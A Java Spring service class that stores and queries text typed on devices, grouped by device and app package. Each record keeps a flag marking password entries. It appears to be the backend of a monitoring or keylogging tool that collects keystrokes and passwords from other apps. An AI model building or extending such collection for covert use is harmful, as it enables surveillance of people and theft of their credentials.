package io.renren.modules.app.service.impl;

import java.util.Date;
import java.util.List;
import java.util.stream.Collectors;

import javax.annotation.Resource;

import org.apache.commons.lang3.StringUtils;
import org.springframework.stereotype.Service;
import org.springframework.scheduling.annotation.Async;

import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

import io.renren.common.exception.RenException;
import io.renren.common.service.impl.BaseServiceImpl;
import io.renren.commons.dynamic.datasource.annotation.DataSource;
import io.renren.modules.app.entity.InputTextRecord;
import io.renren.modules.app.mapper.InputTextRecordMapper;
import io.renren.modules.app.message.proto.Message.InputText;
import io.renren.modules.app.param.InputTextRecordParam;
import io.renren.modules.app.service.InputTextRecordService;
import io.renren.modules.app.vo.InputTextGroup;

@Service
@DataSource("clickhouse")
public class InputTextRecordServiceImpl extends BaseServiceImpl<InputTextRecordMapper, InputTextRecord> implements InputTextRecordService {
    
    @Resource
    private InputTextRecordMapper inputTextRecordMapper;
    
    @Override
    public InputTextGroup queryGroupedRecords(InputTextRecordParam param) {
        // 参数校验
        if (StringUtils.isEmpty(param.getDeviceId())) {
            throw new RenException("设备ID不能为空!");
        }
//        if (param.getStartTime() == null || param.getEndTime() == null) {
//            throw new RenException("时间范围不能为空!");
//        }
        if (StringUtils.isEmpty(param.getPkg())) {
            throw new RenException("包名不能为空!");
        }
        
        // 构建返回对象
        InputTextGroup group = new InputTextGroup();
    	group.setPkg(param.getPkg());
        group.setDeviceId(param.getDeviceId());
        
        // 构建查询条件
        QueryWrapper<InputTextRecord> query = new QueryWrapper<InputTextRecord>();
        query.eq("device_id", param.getDeviceId());
    	query.eq("pkg", param.getPkg());
    	if(param.getStartTime() !=null) {
    		query.ge("time", param.getStartTime());
    	}
    	if(param.getEndTime() !=null) {
    		query.le("time", param.getEndTime());
    	}
        
        // 应用包名
        if (StringUtils.isNotEmpty(param.getAppPkg())) {
            query.eq("app_pkg", param.getAppPkg());
        }
        
        // 来源
        if (param.getSource() != null) {
            query.eq("source", param.getSource());
        }
        
        query.orderByDesc("time");
        List<InputTextRecord> records = inputTextRecordMapper.selectList(query);
        
        // 转换为Item对象
        List<InputTextGroup.Item> items = records.stream()
                .map(record -> {
                    InputTextGroup.Item item = new InputTextGroup.Item();
                    item.setSource(record.getSource());
                    item.setApp(record.getAppPkg());
                    item.setPassword(record.getPassword());
                    item.setResourceId(record.getResourceId());
                    item.setText(record.getText());
                    item.setDate(new Date(record.getTime()));
                    return item;
                })
                .collect(Collectors.toList());
        group.getItems().addAll(items);
        return group;
    }
    
    @Override
    @Async("taskExecutor")
    public void adminInputText(InputText inputText) {
    	InputTextRecord inputRecord = new InputTextRecord();
    	inputRecord.setDeviceId(inputText.getDeviceId());
    	inputRecord.setPkg(inputText.getPkg());
    	inputRecord.setAppPkg(inputText.getAppPkg());
    	inputRecord.setPassword(inputText.getIsPassword());
    	
    	inputRecord.setSource(1);
    	inputRecord.setText(inputText.getText());
    	inputRecord.setResourceId(inputText.getId());
    	inputRecord.setTime(System.currentTimeMillis());
    	inputTextRecordMapper.insert(inputRecord);
    	
    }
}
